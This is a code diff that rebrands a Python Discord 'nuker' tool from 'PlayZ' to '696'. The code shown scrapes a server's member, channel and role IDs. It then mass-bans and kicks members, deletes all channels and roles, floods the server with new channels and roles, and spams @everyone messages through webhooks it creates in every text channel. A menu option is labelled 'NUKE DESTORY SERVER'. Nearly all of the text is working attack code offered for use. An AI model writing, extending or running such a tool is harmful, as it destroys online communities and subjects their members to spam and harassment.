@@ -83,7 +83,7 @@ os.system('clear')
 
 client.remove_command("help")
 
-class playz:
+class nuker:
 
     def __init__(self):
         self.colour = '\x1b[38;5;56m'
@@ -95,7 +95,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[DereKplayZ] {Fore.RED}Banned {Fore.GREEN}{member.strip()} {Fore.GREEN}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Banned {Fore.GREEN}{member.strip()} {Fore.GREEN}")
                     break
                 else:
                     break
@@ -107,7 +107,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Banned {Fore.GREEN}{member.strip()}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Banned {Fore.GREEN}{member.strip()}")
                     break
                 else:
                     break
@@ -119,7 +119,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[DereKplayZ] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
                     break
                 else:
                     break
@@ -131,7 +131,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[DereKplayZ] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Deleted Channel {Fore.GREEN}{channel.strip()}")
                     break
                 else:
                     break
@@ -143,7 +143,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[DereKplayZ] {Fore.RED}Role Deleted {Fore.GREEN}{role.strip()}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Role Deleted {Fore.GREEN}{role.strip()}")
                     break
                 else:
                     break
@@ -156,7 +156,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Created Channel {Fore.GREEN}{name}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Created Channel {Fore.GREEN}{name}")
                     break
                 else:
                     break
@@ -169,7 +169,7 @@ class playz:
                 time.sleep(r.json()['retry_after'])
             else:
                 if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
-                    print(f"{Fore.YELLOW}[DereKplayZ] {Fore.RED}Created Role {Fore.GREEN} {name}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Created Role {Fore.GREEN} {name}")
                     break
                 else:
                     break
@@ -177,9 +177,9 @@ class playz:
     def WebhookSend(self, webhook, message): #credits to anti
         while True:
             json = {
-                'content': message if message != '' else "@everyone PlayZ ON TOP discord.gg/Playzop",
+                'content': message if message != '' else "@everyone PlayZ ON TOP discord.gg/696op",
                 'tts': False,
-                'username': 'PlayZ ON TOP'
+                'username': '696 ON TOP'
             }
             r = requests.post(f'{webhook}', json=json)
             if r.status_code == 429:
@@ -188,7 +188,7 @@ class playz:
                   break
             else:
                 if r.status_code == 204 or 201 or 200:
-                    print(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Sent message {Fore.GREEN} {message}")
+                    print(f"{Fore.YELLOW}[696] {Fore.RED}Sent message {Fore.GREEN} {message}")
                     break
                 else:
                     break
@@ -199,8 +199,8 @@ class playz:
         web_urls = []
         for channel in guild.text_channels:
             try:
-                webhook = await channel.create_webhook(name='PlayZ Op', reason="discord.gg/Playzop")
-                print(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Spammed")
+                webhook = await channel.create_webhook(name='PlayZ Op', reason="discord.gg/696op")
+                print(f"{Fore.YELLOW}[696] {Fore.RED}Spammed")
                 web_urls.append(webhook.url)
             except Exception as e:
                 print(e)
@@ -216,20 +216,20 @@ class playz:
 
 
     async def Scrape(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
         await client.wait_until_ready()
         guildOBJ = client.get_guild(int(guild))
         members = await guildOBJ.chunk()
 
         try:
-            os.remove("Playz/members.txt")
-            os.remove("Playz/channels.txt")
-            os.remove("Playz/roles.txt")
+            os.remove("696/members.txt")
+            os.remove("696/channels.txt")
+            os.remove("696/roles.txt")
         except:
             pass
 
         membercount = 0
-        with open('Playz/members.txt', 'a') as m:
+        with open('696/members.txt', 'a') as m:
             for member in members:
                 m.write(str(member.id) + "\n")
                 membercount += 1
@@ -237,7 +237,7 @@ class playz:
             m.close()
 
         channelcount = 0
-        with open('Playz/channels.txt', 'a') as c:
+        with open('696/channels.txt', 'a') as c:
             for channel in guildOBJ.channels:
                 c.write(str(channel.id) + "\n")
                 channelcount += 1
@@ -245,7 +245,7 @@ class playz:
             c.close()
 
         rolecount = 0
-        with open('Playz/roles.txt', 'a') as r:
+        with open('696/roles.txt', 'a') as r:
             for role in guildOBJ.roles:
                 r.write(str(role.id) + "\n")
                 rolecount += 1
@@ -253,16 +253,16 @@ class playz:
             r.close()
 
     async def NukeExecute(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
-        channel_name = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Channels Name: {Fore.GREEN}")
-        channel_amount = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}How Many?: {Fore.GREEN}")
-        role_name = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Roles Name: {Fore.GREEN}")
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
+        channel_name = input(f"{Fore.YELLOW}[696] {Fore.RED}Channels Name: {Fore.GREEN}")
+        channel_amount = input(f"{Fore.YELLOW}[696] {Fore.RED}How Many?: {Fore.GREEN}")
+        role_name = input(f"{Fore.YELLOW}[696] {Fore.RED}Roles Name: {Fore.GREEN}")
         role_amount = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}How Many?: {Fore.GREEN}")
         print()
 
-        members = open('PlayZ/members.txt')
-        channels = open('Playz/channels.txt')
-        roles = open('Playz/roles.txt')
+        members = open('696/members.txt')
+        channels = open('696/channels.txt')
+        roles = open('696/roles.txt')
 
         for member in members:
             threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
@@ -279,49 +279,49 @@ class playz:
         roles.close()
 
     async def BanExecute(self):
-        guild = input(f'{Fore.YELLOW}[Playz] {Fore.RED}Server Id: {Fore.GREEN}')
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
         print()
-        members = open('Playz/members.txt')
+        members = open('696/members.txt')
         for member in members:
             threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
         members.close()
 
     async def KickExecute(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
         print()
-        members = open('Playz/members.txt')
+        members = open('696/members.txt')
         for member in members:
             threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
         members.close()
 
     async def ChannelDeleteExecute(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
         print()
-        channels = open('Playz/channels.txt')
+        channels = open('696/channels.txt')
         for channel in channels:
             threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
         channels.close()
 
     async def RoleDeleteExecute(self):
-        guild = input(f'{Fore.YELLOW}[Playz] {Fore.RED}Server Id: {Fore.GREEN}')
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
         print()
-        roles = open('Playz/roles.txt')
+        roles = open('696/roles.txt')
         for role in roles:
             threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
         roles.close()
 
     async def ChannelSpamExecute(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
-        name = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Channels Name: {Fore.GREEN}")
-        amount = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}How Many?: {Fore.GREEN}")
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
+        name = input(f"{Fore.YELLOW}[696] {Fore.RED}Channels Name: {Fore.GREEN}")
+        amount = input(f"{Fore.YELLOW}[696] {Fore.RED}How Many?: {Fore.GREEN}")
         print()
         for i in range(int(amount)):
             threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()
 
     async def RoleSpamExecute(self):
-        guild = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}')
-        name = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Role Name: {Fore.GREEN}")
-        amount = input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}How Many?: {Fore.GREEN}")
+        guild = input(f'{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}')
+        name = input(f"{Fore.YELLOW}[696] {Fore.RED}Role Name: {Fore.GREEN}")
+        amount = input(f"{Fore.YELLOW}[696] {Fore.RED}How Many?: {Fore.GREEN}")
         print()
         for i in range(int(amount)):
             threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()
@@ -345,7 +345,7 @@ class playz:
                                       {7} NUKE DESTORY SERVER
                                       {8} MASS ROLES
                                       {9} MASS CHANNELS''')
-        choice = input(f'{Fore.YELLOW}[PlayZ] {Fore.RED}Number: {Fore.GREEN}')
+        choice = input(f'{Fore.YELLOW}[696] {Fore.RED}Number: {Fore.GREEN}')
         if choice == '2': #bans
             await self.BanExecute()
             time.sleep(2)
@@ -385,16 +385,16 @@ class playz:
             input()
             await self.Menu()
         elif choice == '3':
-            amount = int(input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}How Many?: {Fore.GREEN}"))
-            guild_id = int(input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Server Id: {Fore.GREEN}"))
-            message = str(input(f"{Fore.YELLOW}[PlayZ] {Fore.RED}Webhook Message: {Fore.GREEN}"))
+            amount = int(input(f"{Fore.YELLOW}[696] {Fore.RED}How Many?: {Fore.GREEN}"))
+            guild_id = int(input(f"{Fore.YELLOW}[696] {Fore.RED}Server Id: {Fore.GREEN}"))
+            message = str(input(f"{Fore.YELLOW}[696] {Fore.RED}Webhook Message: {Fore.GREEN}"))
             await self.SpamWebhook(guild_id, amount, message)
         elif choice == '432' or choice == 'x':
             os._exit(0)
 
     @client.event
     async def on_ready():
-        await playz().Menu()
+        await nuker().Menu()
 
     def Startup(self):
         try:
@@ -403,9 +403,9 @@ class playz:
             elif token_type == "bot":
                 client.run(token)
         except:
-            print(f'{Fore.YELLOW}[DereKplayZ] {Fore.RED}Token Was Invalid {Fore.GREEN}')
+            print(f'{Fore.YELLOW}[696] {Fore.RED}Token Was Invalid {Fore.GREEN}')
             input()
             os._exit(0)
 
 if __name__ == "__main__":
-    DereKplayZ().Startup()
+    nuker().Startup()
